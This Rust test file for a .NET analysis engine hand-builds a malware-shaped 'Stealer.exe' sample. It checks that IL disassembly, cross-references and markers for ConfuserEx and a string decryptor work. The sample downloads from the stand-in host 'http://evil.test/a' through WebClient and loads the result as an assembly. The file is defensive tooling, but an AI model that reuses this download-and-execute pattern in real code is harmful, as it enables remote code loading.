//! CIL from a hand-built managed PE shaped like commodity malware.
//!
//! `Ns.Program::Main` calls a string decryptor five times after a
//! constant, loads a URL, downloads through `WebClient` and loads an
//! assembly from bytes, inside a try with a catch; `Ns.Crypt::Decrypt`
//! calls a P/Invoke and reads a field. The assembly carries `ConfuserEx`'s
//! `ConfusedByAttribute`. The listing names every token, the index answers
//! callers, strings and APIs, the markers name `ConfuserEx` and the
//! decryptor with their evidence, and no byte of a body makes it panic.

#![expect(
    clippy::missing_panics_doc,
    clippy::expect_used,
    reason = "assertions are the point of a test"
)]

use std::collections::{BTreeMap, BTreeSet};
use std::path::PathBuf;

use crate::protection::{PE_AT, pe, sec};
use borer_engine::analysis::Analysis;
use borer_engine::clr::il;
use borer_engine::clr::managed::{self, Managed};
use borer_engine::clr::markers::markers_tsv;
use borer_engine::program::Program;

/// Where the CLR header sits; the bodies and the metadata follow it.
const TEXT_RVA: u32 = 0x1000;

/// The URL `Main` loads.
const URL: &str = "http://evil.test/a";

/// `Main`'s token.
const MAIN: u32 = 0x0600_0001;

/// An assembly under construction: heaps and the rows of each table.
#[derive(Default)]
struct Asm {
    /// `#Strings`.
    strings: Vec<u8>,
    /// `#Blob`.
    blob: Vec<u8>,
    /// `#US`.
    us: Vec<u8>,
    /// Each table's rows, by table number.
    rows: BTreeMap<u32, Vec<Vec<u8>>>,
}

impl Asm {
    /// A new assembly, each heap starting with its empty entry.
    fn new() -> Self {
        Asm {
            strings: vec![0],
            blob: vec![0],
            us: vec![0],
            rows: BTreeMap::new(),
        }
    }

    /// Adds a name to `#Strings`, as a two-byte index.
    fn s(&mut self, text: &str) -> Vec<u8> {
        let at = u16::try_from(self.strings.len()).expect("small");
        self.strings.extend_from_slice(text.as_bytes());
        self.strings.push(0);
        at.to_le_bytes().to_vec()
    }

    /// Adds a blob, as a two-byte index.
    fn b(&mut self, bytes: &[u8]) -> Vec<u8> {
        let at = u16::try_from(self.blob.len()).expect("small");
        self.blob.push(u8::try_from(bytes.len()).expect("short"));
        self.blob.extend_from_slice(bytes);
        at.to_le_bytes().to_vec()
    }

    /// Adds a user string and returns its token.
    fn us(&mut self, text: &str) -> u32 {
        let at = u32::try_from(self.us.len()).expect("small");
        let units: Vec<u16> = text.encode_utf16().collect();
        self.us
            .push(u8::try_from(units.len() * 2 + 1).expect("short"));
        for u in units {
            self.us.extend_from_slice(&u.to_le_bytes());
        }
        self.us.push(0);
        0x7000_0000 | at
    }

    /// Adds a row of cells to a table.
    fn row(&mut self, table: u32, cells: &[Vec<u8>]) {
        self.rows.entry(table).or_default().push(cells.concat());
    }

    /// The metadata root and its five streams.
    fn root(&self) -> Vec<u8> {
        let mut tables = vec![0, 0, 0, 0, 2, 0, 0, 1];
        let valid = self.rows.keys().fold(0u64, |v, t| v | (1 << t));
        tables.extend_from_slice(&valid.to_le_bytes());
        tables.extend_from_slice(&0u64.to_le_bytes());
        for rows in self.rows.values() {
            tables.extend_from_slice(&u32::try_from(rows.len()).expect("few").to_le_bytes());
        }
        for rows in self.rows.values() {
            tables.extend(rows.iter().flatten());
        }
        let streams: [(&str, Vec<u8>); 5] = [
            ("#~", tables),
            ("#Strings", self.strings.clone()),
            ("#US", self.us.clone()),
            ("#GUID", vec![0x22; 16]),
            ("#Blob", self.blob.clone()),
        ];
        let mut out = b"BSJB\x01\x00\x01\x00\x00\x00\x00\x00\x0c\x00\x00\x00v4.0.30319\x00\x00\x00\x00\x05\x00".to_vec();
        let mut dir_len = 0;
        for (name, _) in &streams {
            dir_len += 8 + (name.len() + 4) / 4 * 4;
        }
        let mut at = out.len() + dir_len;
        let mut data = Vec::new();
        for (name, mut bytes) in streams {
            bytes.resize(bytes.len().div_ceil(4) * 4, 0);
            out.extend_from_slice(&u32::try_from(at).expect("fits").to_le_bytes());
            out.extend_from_slice(&u32::try_from(bytes.len()).expect("fits").to_le_bytes());
            let mut n = name.as_bytes().to_vec();
            n.resize((name.len() + 4) / 4 * 4, 0);
            out.extend_from_slice(&n);
            at += bytes.len();
            data.extend_from_slice(&bytes);
        }
        out.extend_from_slice(&data);
        out
    }
}

/// A `MethodDef` row: its RVA cell, implementation flags, flags, name and
/// signature.
type MethodRow<'a> = (Vec<u8>, u16, u16, &'a str, &'a [u8]);

/// A little-endian two-byte cell.
fn c2(v: u16) -> Vec<u8> {
    v.to_le_bytes().to_vec()
}

/// A little-endian four-byte cell.
fn c4(v: u32) -> Vec<u8> {
    v.to_le_bytes().to_vec()
}

/// `Main`'s fat body: header, code and one small exception section.
fn main_body(url: u32) -> Vec<u8> {
    let mut code = Vec::new();
    for key in 1..=5u8 {
        code.extend_from_slice(&[0x1f, key, 0x28, 4, 0, 0, 6, 0x26]);
    }
    let try_at = code.len();
    code.push(0x72);
    code.extend_from_slice(&url.to_le_bytes());
    code.extend_from_slice(&[
        0x28, 2, 0, 0, 6, 0x0a, 0x06, 0x2c, 7, 0x14, 0x28, 3, 0, 0, 0x0a, 0x26, 0x2a,
    ]);
    let mut body = vec![0x1b, 0x30, 4, 0];
    body.extend_from_slice(&u32::try_from(code.len()).expect("short").to_le_bytes());
    body.extend_from_slice(&0x1100_0001u32.to_le_bytes());
    body.extend_from_slice(&code);
    body.resize(body.len().div_ceil(4) * 4, 0);
    let t = u16::try_from(try_at).expect("short");
    body.extend_from_slice(&[1, 16, 0, 0, 0, 0]);
    body.extend_from_slice(&t.to_le_bytes());
    body.push(10);
    body.extend_from_slice(&(t + 10).to_le_bytes());
    body.push(2);
    body.extend_from_slice(&0x0100_0004u32.to_le_bytes());
    body
}

/// The bodies at their offsets in `.text` after the CLR header: `Main`,
/// `Download`, `Decrypt` and the attribute's constructor.
fn bodies(url: u32) -> Vec<(u32, Vec<u8>)> {
    vec![
        (0x50, main_body(url)),
        (
            0xb0,
            [&[0x32u8, 0x73, 1, 0, 0, 0x0a, 0x02, 0x6f, 2, 0, 0, 0x0a, 0x2a][..]].concat(),
        ),
        (
            0xc0,
            vec![
                0x42, 0x14, 0x14, 0x16, 0x16, 0x28, 3, 0, 0, 6, 0x26, 0x7e, 1, 0, 0, 4, 0x2a,
            ],
        ),
        (0xe0, vec![0x06, 0x2a]),
        (
            0xf0,
            vec![
                0x3a, 0x17, 0x28, 1, 0, 0, 0x2b, 0x26, 0xd0, 1, 0, 0, 0x1b, 0x26, 0x2a,
            ],
        ),
    ]
}

/// The tables: types, the field, methods, references, the P/Invoke, the
/// attribute, the locals signature and the assembly.
fn tables(a: &mut Asm) {
    let (module, hello) = (a.s("Stealer.exe"), a.s("Stealer"));
    a.row(0x00, &[c2(0), module, c2(1), c2(0), c2(0)]);
    for (name, ns) in [
        ("Object", "System"),
        ("WebClient", "System.Net"),
        ("Assembly", "System.Reflection"),
        ("Exception", "System"),
    ] {
        let (n, s) = (a.s(name), a.s(ns));
        a.row(0x01, &[c2(6), n, s]);
    }
    for (name, ns, fields, methods) in [
        ("<Module>", "", 1, 1),
        ("Program", "Ns", 1, 1),
        ("Crypt", "Ns", 2, 4),
        ("ConfusedByAttribute", "", 2, 5),
    ] {
        let (n, s) = (a.s(name), a.s(ns));
        a.row(
            0x02,
            &[c4(0x0010_0001), n, s, c2(5), c2(fields), c2(methods)],
        );
    }
    let (key, key_sig) = (a.s("key"), a.b(&[0x06, 0x0e]));
    a.row(0x04, &[c2(0x16), key, key_sig]);
    methods(a);
    let refs: [(u16, &str, &[u8]); 3] = [
        (2, ".ctor", &[0x20, 0, 1]),
        (2, "DownloadString", &[0x20, 1, 0x0e, 0x0e]),
        (3, "Load", &[0, 1, 0x12, 13, 0x1d, 0x05]),
    ];
    for (typeref, name, sig) in refs {
        let (n, s) = (a.s(name), a.b(sig));
        a.row(0x0a, &[c2((typeref << 3) | 1), n, s]);
    }
    let mut value = vec![1, 0, 17];
    value.extend_from_slice(b"ConfuserEx v1.0.0");
    value.extend_from_slice(&[0, 0]);
    let value = a.b(&value);
    a.row(0x0c, &[c2((1 << 5) | 14), c2((5 << 3) | 2), value]);
    generics(a);
    let locals = a.b(&[0x07, 2, 0x0e, 0x12, 9]);
    a.row(0x11, &[locals]);
    let kernel = a.s("kernel32.dll");
    a.row(0x1a, &[kernel]);
    let entry = a.s("VirtualAlloc");
    a.row(0x1c, &[c2(0x0104), c2((3 << 1) | 1), entry, c2(1)]);
    a.row(
        0x20,
        &[
            c4(0x8004),
            c2(1),
            c2(0),
            c2(0),
            c2(0),
            c4(0),
            c2(0),
            hello,
            c2(0),
        ],
    );
    let mscorlib = a.s("mscorlib");
    a.row(
        0x23,
        &[
            c2(4),
            c2(0),
            c2(0),
            c2(0),
            c4(0),
            c2(0),
            mscorlib,
            c2(0),
            c2(0),
        ],
    );
}

/// Adds the `MethodDef` rows.
///
/// They are `Main`, `Download`, the `VirtualAlloc` P/Invoke, `Decrypt`, the
/// attribute's constructor, `Generic` and `Again`, which shares
/// `Download`'s body under a signature stating half a billion parameters.
fn methods(a: &mut Asm) {
    let at = |off: u32| c4(TEXT_RVA + off);
    let defs: [MethodRow<'_>; 7] = [
        (at(0x50), 0, 0x16, "Main", &[0, 0, 1]),
        (at(0xb0), 0, 0x16, "Download", &[0, 1, 0x0e, 0x0e]),
        (
            c4(0),
            0x80,
            0x2016,
            "VirtualAlloc",
            &[0, 4, 0x18, 0x18, 0x19, 0x09, 0x09],
        ),
        (at(0xc0), 0, 0x16, "Decrypt", &[0, 1, 0x0e, 0x08]),
        (at(0xe0), 0, 0x1886, ".ctor", &[0x20, 1, 1, 0x0e]),
        (at(0xf0), 0, 0x16, "Generic", &[0, 0, 1]),
        (
            at(0xb0),
            0,
            0x16,
            "Again",
            &[0, 0xdf, 0xff, 0xff, 0xff, 1, 0x12, 6, 0x08],
        ),
    ];
    for (rva, implf, flags, name, sig) in defs {
        let (n, s) = (a.s(name), a.b(sig));
        a.row(0x06, &[rva, c2(implf), c2(flags), n, s, c2(1)]);
    }
}

/// A `TypeSpec` whose 32 type arguments are itself, and a `MethodSpec`
/// instantiating `Decrypt` with `string`.
fn generics(a: &mut Asm) {
    let mut bomb = vec![0x15, 0x12, 5, 32];
    for _ in 0..32 {
        bomb.extend_from_slice(&[0x12, 6]);
    }
    let bomb = a.b(&bomb);
    a.row(0x1b, &[bomb]);
    let inst = a.b(&[0x0a, 1, 0x0e]);
    a.row(0x2b, &[c2(4 << 1), inst]);
}

/// The image's bytes, with `patch` applied to `.text` (its offset and
/// byte) before the PE is built.
fn image(patch: Option<(usize, u8)>) -> Vec<u8> {
    let mut a = Asm::new();
    let url = a.us(URL);
    tables(&mut a);
    let meta = a.root();
    let meta_off = 0x100usize;
    let mut text = vec![0u8; meta_off];
    for (off, body) in bodies(url) {
        let off = usize::try_from(off).expect("fits");
        text[off..off + body.len()].copy_from_slice(&body);
    }
    text.extend_from_slice(&meta);
    let mut cor20 = [
        c4(72),
        c2(2),
        c2(5),
        c4(TEXT_RVA + 0x100),
        c4(u32::try_from(meta.len()).expect("fits")),
        c4(1),
        c4(MAIN),
    ]
    .concat();
    cor20.resize(72, 0);
    text[..72].copy_from_slice(&cor20);
    if let Some((at, byte)) = patch {
        text[at] = byte;
    }
    let mut b = pe(&[sec(".text", TEXT_RVA, text)], 0);
    let dir = PE_AT + 24 + 112 + 14 * 8;
    b[dir..dir + 4].copy_from_slice(&TEXT_RVA.to_le_bytes());
    b[dir + 4..dir + 8].copy_from_slice(&72u32.to_le_bytes());
    b
}

/// Loads the image.
fn load(patch: Option<(usize, u8)>) -> Program {
    Program::from_bytes(PathBuf::from("stealer.exe"), image(patch)).expect("the PE loads")
}

/// `Main` disassembles with its header, locals, clause and every token
/// named: the decryptor calls, the user string, the branch's label and
/// the API calls with their signatures.
#[test]
fn a_method_disassembles_with_its_tokens_named() {
    let p = load(None);
    let text = managed::listing(&p, MAIN, 100).expect("Main lists");
    for want in [
        "# .NET method 0x06000001 void Ns.Program::Main(), IL body at",
        "fat header, 62 bytes of code, max stack 4, locals(string, System.Net.WebClient), init locals; 1 exception clauses",
        "# .try IL_0028..IL_0032 catch System.Exception handler IL_0032..IL_0034",
        "IL_0000: ldc.i4.s 1",
        "IL_0002: call string Ns.Crypt::Decrypt(int)",
        "IL_0028: ldstr \"http://evil.test/a\"",
        "IL_002d: call string Ns.Program::Download(string)",
        "IL_0034: brfalse.s IL_003d",
        "IL_0037: call System.Reflection.Assembly System.Reflection.Assembly::Load(byte[])",
        "IL_003d: ret",
    ] {
        assert!(text.contains(want), "{want:?} in\n{text}");
    }
    let download = managed::listing(&p, 0x0600_0002, 100).expect("Download lists");
    assert!(
        download.contains("newobj void System.Net.WebClient::.ctor()"),
        "{download}"
    );
    assert!(
        download.contains("callvirt string System.Net.WebClient::DownloadString(string)"),
        "{download}"
    );
    let decrypt = managed::listing(&p, 0x0600_0004, 100).expect("Decrypt lists");
    assert!(
        decrypt.contains("call nint Ns.Program::VirtualAlloc(nint, nuint, uint, uint)"),
        "{decrypt}"
    );
    assert!(
        decrypt.contains("ldsfld string Ns.Program::key"),
        "{decrypt}"
    );
    assert!(
        managed::listing(&p, 0x0600_0003, 10).is_err(),
        "a P/Invoke has no IL"
    );
}

/// The index answers callers, a method's strings and the APIs it calls,
/// and the method list narrows by tag and by text.
#[test]
fn the_index_answers_callers_strings_and_apis() {
    let p = load(None);
    let a = Analysis::compute(&p);
    let load = managed::targets(&p, "Assembly::Load").expect("a name");
    let xrefs = managed::xrefs_tsv(&p, &a, &load, 0, 50, false).expect("xrefs");
    assert!(xrefs.contains("0x06000001\t"), "{xrefs}");
    let decrypt = managed::targets(&p, "Ns.Crypt::Decrypt").expect("a name");
    let xrefs = managed::xrefs_tsv(&p, &a, &decrypt, 0, 50, false).expect("xrefs");
    assert!(xrefs.starts_with("# 6 IL references"), "{xrefs}");
    assert!(
        xrefs.contains("IL_0001 call\tConfusedByAttribute::Generic"),
        "{xrefs}"
    );
    let key = managed::targets(&p, "Ns.Program::key").expect("a field");
    assert_eq!(key, BTreeSet::from([0x0400_0001]));
    let xrefs = managed::xrefs_tsv(&p, &a, &key, 0, 50, false).expect("xrefs");
    assert!(
        xrefs.contains("IL_000a ldsfld\tNs.Crypt::Decrypt"),
        "{xrefs}"
    );
    let index = Managed::build(&p);
    let shared = |t: u32| index.method(t).map(|m| m.sites.clone());
    assert_eq!(
        shared(0x0600_0007),
        shared(0x0600_0002),
        "a shared body reads once"
    );
    let strings = managed::strings_tsv(&p, &a, MAIN).expect("strings");
    assert!(
        strings.contains("IL_0028\t0x70000001\t\"http://evil.test/a\""),
        "{strings}"
    );
    let detail = managed::detail(&p, &a, 0x0600_0004, 0).expect("detail");
    assert!(detail.contains("caller\t0x06000001\t5\t"), "{detail}");
    assert!(detail.contains("tags pinvoke"), "{detail}");
    let paged = managed::detail(&p, &a, 0x0600_0004, 1).expect("detail");
    assert!(paged.contains("rows from 1"), "{paged}");
    assert!(!paged.contains("caller	0x06000001"), "{paged}");
    let net = managed::methods_tsv(&p, &a, "net").expect("methods");
    assert!(
        net.contains("Ns.Program::Download\tSystem.Net.WebClient::.ctor"),
        "{net}"
    );
    assert!(!net.contains("Ns.Program::Main\t"), "{net}");
    let by_text = managed::methods_tsv(&p, &a, "evil.test").expect("methods");
    assert!(
        by_text.contains("Ns.Program::Main\t\"http://evil.test/a\""),
        "{by_text}"
    );
    let tokens: BTreeSet<u32> = managed::targets(&p, "0x0a000003").expect("a token");
    assert_eq!(tokens, BTreeSet::from([0x0a00_0003]));
}

/// The markers name `ConfuserEx` by its attribute and argument, and the
/// decryptor by its shape, each with its evidence.
#[test]
fn the_markers_name_confuserex_and_the_decryptor() {
    let p = load(None);
    let a = Analysis::compute(&p);
    let text = markers_tsv(&p, &a).expect("markers");
    assert!(text.contains("confuserex\tstrong\t"), "{text}");
    assert!(
        text.contains("ConfusedByAttribute(\"ConfuserEx v1.0.0\") on 0x20000001"),
        "{text}"
    );
    assert!(
        text.contains("string-decryptor\tmedium\tstring Ns.Crypt::Decrypt(int) 0x06000004: 5 calls from 1 methods, 100% right after a constant"),
        "{text}"
    );
    assert_eq!(
        text,
        markers_tsv(&p, &Analysis::compute(&p)).expect("again"),
        "deterministic"
    );
}

/// A type whose arguments refer back to itself renders bounded, as does a
/// signature stating half a billion parameters, and a generic
/// instantiation of a method names its type arguments.
#[test]
fn a_self_referring_type_renders_bounded() {
    let p = load(None);
    let text = managed::listing(&p, 0x0600_0006, 100).expect("Generic lists");
    assert!(
        text.contains("call string Ns.Crypt::Decrypt<string>(int)"),
        "{text}"
    );
    assert!(
        text.contains("ldtoken System.Object<System.Object<"),
        "{text}"
    );
    assert!(text.len() < 8192, "{} bytes", text.len());
    let again = managed::listing(&p, 0x0600_0007, 100).expect("Again lists");
    assert!(
        again.contains("ConfusedByAttribute::Again(System.Object<"),
        "{again}"
    );
    assert!(again.len() < 8192, "{} bytes", again.len());
}

/// No byte of a body set to anything makes reading, listing or indexing
/// panic.
#[test]
fn no_byte_of_a_body_makes_the_il_view_panic() {
    for at in 0x50..0xf0usize {
        for byte in [0x00, 0x03, 0x45, 0x80, 0xfe, 0xff] {
            let p = load(Some((at, byte)));
            for token in 0x0600_0001..=0x0600_0005u32 {
                let _ = managed::listing(&p, token, 1000);
            }
            let a = Analysis::compute(&p);
            assert!(markers_tsv(&p, &a).is_ok());
            assert!(Managed::build(&p).methods.len() <= 6);
        }
    }
}

/// A tiny body decodes, its branch's target an offset in the code.
#[test]
fn a_tiny_body_decodes_with_its_branch_target() {
    let bytes = [0x16, 0x14, 0x2c, 0x01, 0x00, 0x2a];
    let (b, code) = il::body(&bytes).expect("a tiny body");
    assert_eq!((b.fat, b.max_stack, b.code_len), (false, 8, 5));
    let (instrs, stop) = il::decode(code);
    assert!(stop.is_none());
    let names: Vec<&str> = instrs.iter().map(il::Instr::name).collect();
    assert_eq!(names, ["ldnull", "brfalse.s", "nop", "ret"]);
    assert_eq!(instrs[1].operand, il::Operand::Target(4));
}

/// A fat body reads its flags, locals token and a finally clause.
#[test]
fn a_fat_body_reads_its_clauses() {
    let mut bytes = vec![0x1b, 0x30, 2, 0, 4, 0, 0, 0, 1, 0, 0, 0x11];
    bytes.extend_from_slice(&[0x00, 0xfe, 0x1a, 0x2a]);
    bytes.extend_from_slice(&[1, 16, 0, 0, 2, 0, 0, 0, 1, 2, 0, 1, 0, 0, 0, 0]);
    let (b, code) = il::body(&bytes).expect("a fat body");
    assert!(b.init_locals);
    assert_eq!(b.locals, 0x1100_0001);
    assert_eq!(code.len(), 4);
    assert_eq!(b.clauses.len(), 1);
    assert_eq!(b.clauses[0].kind, il::ClauseKind::Finally);
    assert_eq!((b.clauses[0].try_start, b.clauses[0].try_end), (0, 1));
    let (instrs, _) = il::decode(code);
    assert_eq!(instrs[1].name(), "rethrow");
}

/// A cut operand or a bad header stops with the reason.
#[test]
fn a_cut_operand_stops_decoding_with_the_offset() {
    let (instrs, stop) = il::decode(&[0x00, 0x28, 1, 2]);
    assert_eq!(instrs.len(), 1);
    assert_eq!(
        stop.as_deref(),
        Some("IL_0001: the operand runs past the code")
    );
    let (_, stop) = il::decode(&[0x45, 0xff, 0xff, 0xff, 0xff]);
    assert!(stop.is_some());
    assert!(il::body(&[0x03, 0x30]).is_err());
    assert!(il::body(&[0x01]).is_err());
}
